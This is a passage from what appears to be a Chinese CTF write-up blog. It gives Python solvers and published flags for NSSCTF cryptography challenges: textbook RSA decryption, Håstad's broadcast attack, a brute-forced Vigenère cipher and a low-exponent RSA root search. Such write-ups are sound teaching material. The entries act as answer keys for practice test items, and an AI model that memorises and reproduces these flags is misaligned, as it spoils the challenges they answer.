7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421<br>q = 7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093</p><p>解密结果: b’NSSCTF{no_why}’</p></blockquote><hr><h2 id="25-AFCTF-2018-你能看出这是什么加密么"><a href="#25-AFCTF-2018-你能看出这是什么加密么" class="headerlink" title="25 [AFCTF 2018]你能看出这是什么加密么"></a>25 [AFCTF 2018]你能看出这是什么加密么</h2><p>🚩flag：<code>NSSCTF{R54_|5_$0_$imp13}</code></p><p>💡hint：<code>RSA</code></p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">p=<span class="number">0</span>x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f</span><br><span class="line"></span><br><span class="line">q=<span class="number">0</span>xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061</span><br><span class="line"></span><br><span class="line">e=<span class="number">0</span>x10001</span><br><span class="line"></span><br><span class="line">c=<span class="number">0</span>x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6&nbsp;&nbsp; </span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6</span></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, p * q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><p>b’\x02\xd3\xe4v\xea\x80r\x83\xda\x99\x88\xf5#\x08\xbbAT\x8b\xaf\xd2\xf4\xdc\x9f\xd3\xbf\xb7A\xc3\xcc\xc5`\xa1\x8b\x86\x18y\xd0&amp;\x88\x10\xef\xbe\x83\xcer\xceC\x17\xec[\xb7%\x08\xef\x16\x1f\xab\x0c\x96\xa3\xdc N^\x8e,\xa3\x11{\x99U\xcd\x15o\xd7B\xf4L\x8f}&amp;\xc5$\xca\xd5;\xf9\x02Y\xc1\xbbS\xfd4\x83M\x96\xa9\xbd;\x83/\xf7\x00afctf{R54_|5_$0_$imp13}’</p></blockquote><hr><h2 id="26-鹤城杯-2021-Crazy-Rsa-Tech"><a href="#26-鹤城杯-2021-Crazy-Rsa-Tech" class="headerlink" title="26 [鹤城杯 2021]Crazy_Rsa_Tech"></a>26 [鹤城杯 2021]Crazy_Rsa_Tech</h2><p>🚩flag：<code>NSSCTF{H0w_Fun_13_HAstads_broadca5t_AtTack!}</code></p><p>💡hint：<code>RSA</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">FLAG = bytes_to_long(pad(<span class="string">b"flag{??????}"</span>,<span class="number">64</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_key</span>():</span><br><span class="line">    p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">9</span></span><br><span class="line">    <span class="keyword">while</span>(GCD((p-<span class="number">1</span>)*(q-<span class="number">1</span>),e)!=<span class="number">1</span>):</span><br><span class="line">        p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">        n = p*q</span><br><span class="line">    d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> n,e,d</span><br><span class="line"></span><br><span class="line">n_list=<span class="built_in">list</span>()</span><br><span class="line">c_list=<span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    N,e,d=init_key()</span><br><span class="line">    n_list.append(N)</span><br><span class="line">    c=<span class="built_in">pow</span>(FLAG,e,N)</span><br><span class="line">    c_list.append(<span class="built_in">pow</span>(FLAG,e,N))</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">pow</span>(c,d,N)==FLAG)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"n_list:"</span>,n_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"c_list:"</span>,c_list)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">n_list: [<span class="number">71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799</span>, <span class="number">92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949</span>, <span class="number">100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919</span>, <span class="number">59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847</span>, <span class="number">66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147</span>, <span class="number">120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377</span>, <span class="number">72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281</span>, <span class="number">69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951</span>, <span class="number">76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581</span>]</span><br><span class="line">c_list: [<span class="number">62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585</span>, <span class="number">46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900</span>, <span class="number">85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198</span>, <span class="number">14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656</span>, <span class="number">1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839</span>, <span class="number">2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981</span>, <span class="number">16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376</span>, <span class="number">31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996</span>, <span class="number">25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515</span>]</span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n_list = [</span><br><span class="line">   <span class="number">71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799</span>,</span><br><span class="line">   <span class="number">92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949</span>,</span><br><span class="line">   <span class="number">100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919</span>,</span><br><span class="line">   <span class="number">59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847</span>,</span><br><span class="line">   <span class="number">66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147</span>,</span><br><span class="line">   <span class="number">120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377</span>,</span><br><span class="line">   <span class="number">72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281</span>,</span><br><span class="line">   <span class="number">69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951</span>,</span><br><span class="line">   <span class="number">76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581</span>]</span><br><span class="line">c_list = [</span><br><span class="line">   <span class="number">62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585</span>,</span><br><span class="line">   <span class="number">46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900</span>,</span><br><span class="line">   <span class="number">85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198</span>,</span><br><span class="line">   <span class="number">14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656</span>,</span><br><span class="line">   <span class="number">1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839</span>,</span><br><span class="line">   <span class="number">2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981</span>,</span><br><span class="line">   <span class="number">16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376</span>,</span><br><span class="line">   <span class="number">31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996</span>,</span><br><span class="line">   <span class="number">25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515</span>]</span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n_list:</span><br><span class="line">   n = n * i</span><br><span class="line"></span><br><span class="line">n_ = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n_list:</span><br><span class="line">   n_.append(n // i)</span><br><span class="line"></span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">   t.append(inverse(n_[i], n_list[i]))</span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n_list)):</span><br><span class="line">   x = c_list[i] * n_[i] * t[i] + x</span><br><span class="line">x = x % n</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">x = iroot(x, <span class="number">9</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><p>3678337284039442047026947312380394506988284605153398380909870598085147736828709178219597429308046538374273111663234962853201175297522552444068549756304348183089003998584929250444862897734669616839072634559776823068102560978738392642133409979083241310818961120830565330801827594023873873703163937572703881578432281109467318674533265052430906776650900523035132668203491899352234368836316318216812572637893433384928785981896373747430646617935503364537613820302679656375356094380483213814869276308187497478084540603362678580814022322799191778371368875742773945120383365613028633102737056410926701477700008313642639347163933146129361496566648131161287075292980980083166106192999528561889437021539352391671756010617540361596164032486633114877739259434431765044242037641759566659268290619705700083536966807192023377334915872207418596226819579720241509860110741821630775501873143209229299530346706612248414951753383716954165108266753409813119293227854442685830689203424064786691447734948037502729127922328149002842971722645909768174575776908113523451541199095073733017029558396658874593357205426105429760517295964966905772455366037986657671195106462661190327510507460112791663031458690187525393979689469548319821181450874331998372947479866557921497942728807505035932385939931524294822439633516457845581452433022749099648076725811489217888688273759202726271093237450290814247396662589614216704<br>b’flag{H0w_Fun_13_HAstads_broadca5t_AtTack!}\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16’</p></blockquote><hr><h2 id="27-SWPUCTF-2021-新生赛-crypto9"><a href="#27-SWPUCTF-2021-新生赛-crypto9" class="headerlink" title="27 [SWPUCTF 2021 新生赛]crypto9"></a>27 [SWPUCTF 2021 新生赛]crypto9</h2><p>🚩flag：<code>NSSCTF{dd5f0021-7a8e-ee05-f25e-7882abc5d984}</code></p><p>💡hint：<code>其他</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">AKKPLX{qv5x0021-7n8w-wr05-x25w-7882ntu5q984}</span><br><span class="line">脚本给你了，去解吧</span><br><span class="line"></span><br><span class="line">letter_list = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>  <span class="comment"># 字母表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据输入的key生成key列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_KeyList</span>(<span class="params">key</span>):</span><br><span class="line">    key_list = []</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> key:</span><br><span class="line">        key_list.append(<span class="built_in">ord</span>(ch.upper()) - <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">plaintext, key_list</span>):</span><br><span class="line">    ciphertext = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:  <span class="comment"># 遍历明文</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># 明文是否为字母,如果是,则判断大小写,分别进行加密</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> + key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> + key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 如果密文不为字母,直接添加到密文字符串里</span></span><br><span class="line">            ciphertext += ch</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    plaintext = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ciphertext:  <span class="comment"># 遍历密文</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># 密文为否为字母,如果是,则判断大小写,分别进行解密</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> - key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> - key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 如果密文不为字母,直接添加到明文字符串里</span></span><br><span class="line">            plaintext += ch</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"加密请按D,解密请按E:"</span>)</span><br><span class="line">    user_input = <span class="built_in">input</span>();</span><br><span class="line">    <span class="keyword">while</span> (user_input != <span class="string">'D'</span> <span class="keyword">and</span> user_input != <span class="string">'E'</span>):  <span class="comment"># 输入合法性判断</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"输入有误!请重新输入:"</span>)</span><br><span class="line">        user_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"请输入密钥:"</span>)</span><br><span class="line">    key = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">False</span> == key.isalpha()):  <span class="comment"># 输入合法性判断</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"输入有误!密钥为字母,请重新输入:"</span>)</span><br><span class="line">        key = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    key_list = Get_KeyList(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_input == <span class="string">'D'</span>:</span><br><span class="line">        <span class="comment"># 加密</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"请输入明文:"</span>)</span><br><span class="line">        plaintext = <span class="built_in">input</span>()</span><br><span class="line">        ciphertext = Encrypt(plaintext, key_list)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"密文为:\n%s"</span> % ciphertext)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 解密</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"请输入密文:"</span>)</span><br><span class="line">        ciphertext = <span class="built_in">input</span>()</span><br><span class="line">        plaintext = Decrypt(ciphertext, key_list)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"明文为:\n%s"</span> % plaintext)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">letter_list = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>  <span class="comment"># 字母表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_KeyList</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="string">"""将密钥转换为数字列表（A=0, B=1, ...）"""</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">ord</span>(ch.upper()) - <span class="number">65</span> <span class="keyword">for</span> ch <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="string">"""维吉尼亚解密函数"""</span></span><br><span class="line">    plaintext = <span class="string">""</span></span><br><span class="line">    key_list = Get_KeyList(key)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> i % <span class="built_in">len</span>(key_list) == <span class="number">0</span>:</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():</span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> - key_list[i]) % <span class="number">26</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> - key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext += ch</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文输入</span></span><br><span class="line">ciphertext = <span class="string">"AKKPLX{qv5x0021-7n8w-wr05-x25w-7882ntu5q984}"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试常见密钥</span></span><br><span class="line">common_keys = [<span class="string">"CTF"</span>, <span class="string">"FLAG"</span>, <span class="string">"NSS"</span>, <span class="string">"KEY"</span>, <span class="string">"SECRET"</span>]</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> common_keys:</span><br><span class="line">    decrypted = Decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"密钥 '<span class="subst">{key}</span>': <span class="subst">{decrypted}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果常见密钥无效，尝试暴力破解所有3字母密钥</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(<span class="string">"NSS"</span> <span class="keyword">in</span> Decrypt(ciphertext, key) <span class="keyword">for</span> key <span class="keyword">in</span> common_keys):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"\n尝试暴力破解3字母密钥..."</span>)</span><br><span class="line">    <span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line">    <span class="keyword">for</span> key_tuple <span class="keyword">in</span> product(letter_list, repeat=<span class="number">3</span>):</span><br><span class="line">        key = <span class="string">''</span>.join(key_tuple)</span><br><span class="line">        decrypted = Decrypt(ciphertext, key)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"NSS"</span> <span class="keyword">in</span> decrypted:  <span class="comment"># 假设Flag包含"NSS"</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"找到可能密钥: <span class="subst">{key}</span>, 解密结果: <span class="subst">{decrypted}</span>"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>密钥 ‘CTF’: YRFNSS{oc5s0021-7l8d-rp05-e25r-7882lap5o984}<br>密钥 ‘FLAG’: VZKJGM{qp5s0021-7c8w-qm05-m25w-7882hoj5q984}<br>密钥 ‘NSS’: NSSCTF{dd5f0021-7a8e-ee05-f25e-7882abc5d984}<br>密钥 ‘KEY’: QGMFHZ{gr5z0021-7d8s-yh05-t25y-7882dpw5g984}<br>密钥 ‘SECRET’: IGIYHE{yr5v0021-7w8s-dz05-t25u-7882wpb5y984}</p></blockquote><hr><h2 id="28-SWPUCTF-2021-新生赛-crypto5"><a href="#28-SWPUCTF-2021-新生赛-crypto5" class="headerlink" title="28 [SWPUCTF 2021 新生赛]crypto5"></a>28 [SWPUCTF 2021 新生赛]crypto5</h2><p>🚩flag：<code>NSSCTF{because_i_like}</code></p><p>💡hint：<code>RSA</code></p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">flag= <span class="number">25166751653530941364839663846806543387720865339263370907985655775152187319464715737116599171477207047430065345882626259880756839094179627032623895330242655333</span></span><br><span class="line">n= <span class="number">134109481482703713214838023035418052567000870587160796935708584694132507394211363652420160931185332280406437290210512090663977634730864032370977407179731940068634536079284528020739988665713200815021342700369922518406968356455736393738946128013973643235228327971170711979683931964854563904980669850660628561419</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>这个题目信息，只给了一个ciphertext(flag)和n，得知为RSA。思考一下RSA几种常见攻击，可以断定这是低加密指数小明文攻击。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag = <span class="number">25166751653530941364839663846806543387720865339263370907985655775152187319464715737116599171477207047430065345882626259880756839094179627032623895330242655333</span></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"><span class="comment"># e从2开始遍历，随便找一个较小的值，我这里取的是2**6。运行找到可以开e次方的flag，并得到其结果</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(e &lt; <span class="number">2</span>**<span class="number">6</span>):</span><br><span class="line">    e += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(gmpy2.iroot(flag , e))        </span><br><span class="line"><span class="comment"># 添加一个print语句，将结果复制粘贴，转换格式</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">29305044677847256883031643626546437461373017758852477</span>))</span><br></pre></td></tr></tbody></table></figure><blockquote><p>(mpz(29305044677847256883031643626546437461373017758852477), True)<br>(mpz(2239787367494658961926395047063833603906), False)<br>(mpz(30211023082079078184793394727428), False)<br>(mpz(171187162713350842203231979), False)<br>(mpz(30607823753538418950179), False)<br>(mpz(47326391870653513426), False)<br>(mpz(308305161786402933), False)<br>(mpz(5496455501691892), False)<br>(mpz(203782133965548), False)<br>(mpz(13083851218710), False)<br>(mpz(1281610142349), False)<br>(mpz(174950918127), False)<br>(mpz(31145010208), 